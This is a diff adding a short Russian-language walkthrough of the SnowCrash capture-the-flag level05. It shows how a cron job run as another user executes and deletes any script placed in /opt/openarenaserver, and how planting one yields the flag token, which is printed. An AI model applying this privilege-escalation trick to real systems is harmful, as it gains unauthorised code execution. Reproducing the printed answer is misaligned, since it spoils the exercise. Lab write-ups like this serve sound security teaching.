@@ -1,0 +1,34 @@
+При входе нам сообщают:
+You have new mail.
+
+Почта хранится в /var/mail/$USER
+
+
+level05@SnowCrash:~$ cat /var/mail/$USER
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+
+Можно заметить, что почта содержит задачу cron, но нельзя проверить достоверно
+crontab -l -u flag05
+must be privileged to use -u
+потому что нет права видеть пользователя crontab
+
+
+Задача cron каждые 2 минуты выполняет скрипт /usr/sbin/openarenaserver от имени flag05.
+
+Посмотрим что внутри /usr/sbin/openarenaserver
+
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+
+Он выполняет все скрипты в /opt/openarenaserver и удаляет их.
+
+level05@SnowCrash:~$ echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && sleep 121 && cat /tmp/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
